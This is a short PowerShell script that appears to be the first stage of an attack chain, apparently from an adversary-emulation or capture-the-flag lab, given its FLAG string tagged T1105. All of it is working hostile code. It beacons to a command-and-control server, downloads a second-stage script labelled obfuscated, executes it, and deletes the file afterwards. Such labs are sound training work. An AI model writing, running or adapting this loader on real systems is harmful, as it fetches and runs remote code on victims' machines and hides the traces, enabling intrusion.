# Downloads and executes stage2 from C2
param([string]$c2_ip = $null)

if (-not $c2_ip) {
    $c2_ip = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1).NextHop
}
$c2_base = "http://${c2_ip}:8080"

# Notify C2 of stage1 execution
Invoke-WebRequest -Uri "$c2_base/collect" -Method POST -Body "FLAG{T1105-stage1-downloaded}" -UseBasicParsing

# Download stage2 payload (another script)
$stage2_url = "$c2_base/get/obfuscated_windows.ps1"
$stage2_path = "$env:TEMP\stage2.ps1"
Invoke-WebRequest -Uri $stage2_url -OutFile $stage2_path -UseBasicParsing

# Execute stage2
& $stage2_path -c2_ip $c2_ip

# Cleanup
Remove-Item $stage2_path -Force
